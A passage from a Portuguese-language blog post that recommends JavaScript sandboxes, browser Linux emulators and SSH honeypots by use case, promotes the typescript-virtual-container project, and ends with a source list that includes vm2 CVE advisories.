→ `isolated-vm`. Verdadeiro V8 Isolate, limites de memória estritos, ponte de comunicação explícita. Evite `vm2` -- a lista de CVEs só aumenta, sério, é tipo uma nova a cada poucos meses. Evite `vm` -- não é um sandbox, por favor.

**Você precisa isolar JS e não quer extensão nativa, ou precisa de compatibilidade com navegador.**  
→ `quickjs-emscripten`. Fronteira Wasm, módulo de cerca de 500 KB, funciona em navegadores e Node. Mais lento que V8 mas realmente isolado.

**Você precisa iniciar um SO Linux real não modificado com compatibilidade binária.**  
→ `v86` para Linux 32-bit, ou `container2wasm` se você tem uma imagem Docker existente. Aceite 150 MB+ de RAM e 30 segundos de inicialização, é o acordo. Se precisar de 64-bit, olhe CheerpX ou use um runtime de contêiner real.

**Você precisa embutir um terminal tipo Linux em uma aplicação web sem backend.**  
→ `v86` (SO completo, pesado, lento para iniciar) ou o bundle de navegador do `typescript-virtual-container` (simulador, mais leve, inicialização instantânea, inclui `startxfce4` para um desktop completo o que é bem legal).

**Você precisa de tutoriais de código interativos online ou um IDE no navegador.**  
→ WebContainers se você está focado no ecossistema Node.js. CheerpX se você precisa de um userspace Linux real. O bundle de navegador do `typescript-virtual-container` se você quer uma opção mais leve com API tipada.

**Você quer coletar TTPs de atacantes SSH em larga escala.**  
→ Cowrie é o padrão de produção, ponto final. Roda em qualquer servidor Linux, integra com todos os SIEMs, tem modo LLM agora. Use Cowrie.

**Você quer dados de honeypot SSH em uma aplicação Node.js com API programável.**  
→ `typescript-virtual-container`. Os comandos realmente executam. O VFS é uma estrutura de dados real que você pode instantaneamente capturar e diferenciar. O atacante obtém um ambiente interativo convincente, e você obtém dados de auditoria estruturados sem sair do Node.

**Você precisa de automação shell / testes em CI sem Docker.**  
→ `typescript-virtual-container`. Inicia em menos de um segundo, instantâneo antes de um teste, restauração depois. Executa comandos shell com API tipada. Sem daemon Docker, sem kernel, sem VM, sem espera.

**Você precisa de ambientes shell multi-inquilino (SaaS, educação, treinamento).**  
→ `typescript-virtual-container`. 5-20 MB por instância vs. 150-256 MB para um emulador. 100 usuários simultâneos: ~2 GB vs. ~25 GB. É uma grande diferença em custos de hospedagem!

**Você precisa de um honeypot realista que também te permita construir um laboratório de rede multi-VM.**  
→ `typescript-virtual-container` é a única coisa neste espaço que faz ambos.

---

## O que ele não pode fazer (e quero ser honesto sobre isso)

Ele não pode executar binários x86 nativos. Se você precisa compilar código C, executar um interpretador Python real, ou usar software compilado para Linux, não há uma ABI de kernel para suportar essas chamadas de sistema. Comandos como `gcc`, `python3` e `node` são stubs -- eles respondem a `--version` e invocações comuns, mas não executam nada real.

Esta é a troca fundamental: você ganha 10 a 50 vezes menos memória, inicialização instantânea, compatibilidade com navegador, API tipada, SSH real e rede virtual -- e você abandona a compatibilidade binária com o userspace Linux.

Fortune pensou muito sobre isso ao projetar o projeto. Para os casos de uso que ela visava -- honeypots, testes, terminais embarcados, ambientes CI -- executar um binário compilado nunca é realmente necessário. Pipelines shell, manipulação de arquivos, roteamento de rede e SSH cobrem tudo. Mas se seu caso de uso requer software compilado real, `v86` ou Docker é a resposta certa, não isso.

---

## Para concluir

Então é isso. Este ecossistema é mais amplo e mais fragmentado do que parece de fora. `vm` é um separador de escopo, não um sandbox. `vm2` continua acumulando CVEs (sério, olhe os avisos deste mês). `isolated-vm` é a resposta certa para isolamento JS mas JS apenas. `quickjs-emscripten` é a escolha certa quando você precisa de compatibilidade com navegador ou quer evitar extensões nativas. `v86` e CheerpX são verdadeiros emuladores quando você precisa de compatibilidade binária real. WebContainers é Node.js em Wasm, não um ambiente Linux de propósito geral. Cowrie é o padrão-ouro dos honeypots SSH, mas é Python e não nativo Node.

E então tem o `typescript-virtual-container` -- o projeto da Fortune -- que vive um pouco em sua própria categoria. Não é um emulador, não é um sandbox JS, não é um honeypot passivo. Algo entre todos que se mostrou surpreendentemente útil para muitas coisas que nenhum dos outros pode fazer.

`typescript-virtual-container` preenche a lacuna que nenhum dos outros toca: um ambiente shell Linux completo e programável com SSH real, SFTP, permissões POSIX, gerenciamento de usuários, rede virtual e uma API TypeScript tipada -- rodando em cerca de 10 MB, iniciando em menos de um segundo, funcionando tanto no Node.js quanto no navegador.

Se você quiser experimentar: o código fonte está em [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) e há uma demo online (incluindo `startxfce4` para um desktop completo, que é francamente doentio) em [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo). Vá dar uma olhada e deixe algumas estrelas para Fortune no GitHub, ela merece!

Obrigado por ler -- este foi longo até para meus padrões :) espero que tenha sido útil!

---

## Fontes

Tentei ligar cada afirmação a uma fonte primária -- avisos CVE, docs oficiais, repositórios GitHub, posts de blog dos mantenedores. Algumas notas: a lista de CVEs do vm2 continua crescendo então o link do FortiGuard pode estar desatualizado quando você ler isto (veja a página de avisos do GitHub para as mais recentes). Os links do Bellard são todos estáveis -- o site pessoal dele está lá desde sempre e o conteúdo não muda. E se você quiser se aprofundar em algum dos polyfills, basta percorrer a pasta `polyfills/` no repositório `typescript-virtual-container` diretamente -- é mais legível que qualquer descrição que eu poderia escrever aqui.

### Sandboxes JavaScript

- **Módulo `vm` do Node.js** -- documentação oficial: [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Aviso de segurança `vm` do Node.js** -- "O módulo vm não é um mecanismo de segurança. Não o use para executar código não confiável": [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`** -- npm: [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub: [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **Cronologia de CVEs vm2** -- Alerta FortiGuard com lista completa de CVEs e datas: [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017** -- Fuga por erro async, GHSA: [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314** -- Proxy + Error.name + Function escape, gist PoC: [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466** -- Entrada Exploit DB com PoC completo: [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **CVE vm2 2026** -- 11 novas fugas, análise: [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer: [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"Why Sandboxing JS in JS is Hard"** -- Post-mortem da oxeye.io sobre CVE-2022-36067: [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`** -- npm: [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub: [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **Internos V8 Isolate** -- Guia de integração: [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`** -- npm: [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub: [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`** -- npm: [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub: [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **Motor QuickJS** -- por Fabrice Bellard: [bellard.org/quickjs](https://bellard.org/quickjs/)
- **Modelo de permissões Deno** -- docs: [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Lançamento Deno 2** -- Outubro 2024: [deno.com/blog/v2](https://deno.com/blog/v2)
- **Proposta TC39 ShadowRealm** -- [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **Proposta TC39 Compartments** -- [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"Sandboxing JavaScript Code"** -- Artigo prático de Andrew Healey sobre a abordagem de sandbox Deno: [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Emuladores Linux

- **`v86`** -- npm: [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub: [github.com/copy/v86](https://github.com/copy/v86) · Demo: [copy.sh/v86](https://copy.sh/v86)
- **Matriz de suporte de SO v86** -- [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS** (BIOS usado pelo v86) -- [seabios.org](https://www.seabios.org/SeaBIOS)
- **Extensões Bochs VBE** (referência VGA) -- [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux** -- Emulador de Bellard: [bellard.org/jslinux](https://bellard.org/jslinux/) · Notas técnicas (TinyEMU, histórico, asm.js→Wasm): [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU** -- Código fonte C: [bellard.org/tinyemu](https://bellard.org/tinyemu/) · Espelhos GitHub não oficiais: [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k** -- Emulador JS OpenRISC: [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · Demo: [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX** -- docs: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · Guia pthreads: [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers** -- npm: [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · Docs API: [webcontainers.io](https://webcontainers.io) · Anúncio: [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · Visão geral InfoQ: [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm** -- GitHub: [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · Post de blog NTT: [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Artigo de Simon Willison: [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### Stack de terminal

- **xterm.js** -- npm: [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub: [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · site: [xtermjs.org](https://xtermjs.org)
- **node-pty** -- npm: [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft): [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### Honeypots

- **Cowrie** -- GitHub: [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · Docs: [docs.cowrie.org](https://docs.cowrie.org) · Site: [cowrie.org](https://www.cowrie.org/)
- **Kippo** -- GitHub (arquivado): [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh** -- GitHub: [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame** -- GitHub: [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird** -- Docker Hub: [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot** -- Honeypot SSH Node.js mínimo: [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots** -- Lista curada: [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082** -- Descoberta de informações do sistema (como atacantes identificam honeypots): [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm** : [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub** : [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **Demo online** : [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **Guia de arquitetura** : [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (implementação do protocolo SSH) -- npm: [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub: [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`** (compressão dos instantâneos VFS) -- npm: [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (transporte shell WebSocket) -- npm: [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### Leituras complementares

- **Modelo de permissões POSIX** -- Especificação Open Group: [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **Write-ahead logging** (padrão usado na persistência VFS) -- [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **Modelo V8 Isolate** -- "Embedder's Guide": [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **Especificação ISA RISC-V** (para contexto TinyEMU/JSLinux) -- [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **Arquitetura OpenRISC 1000** -- [opencores.org/or1k](https://opencores.org/or1k/)
- **"Running Python code in a Pyodide sandbox via Deno"** -- Simon Willison TIL, contraste útil com a abordagem Wasm: [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"Running self-hosted QuickJS in a browser"** -- Simon Willison TIL sobre o tamanho do bundle quickjs-emscripten: [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
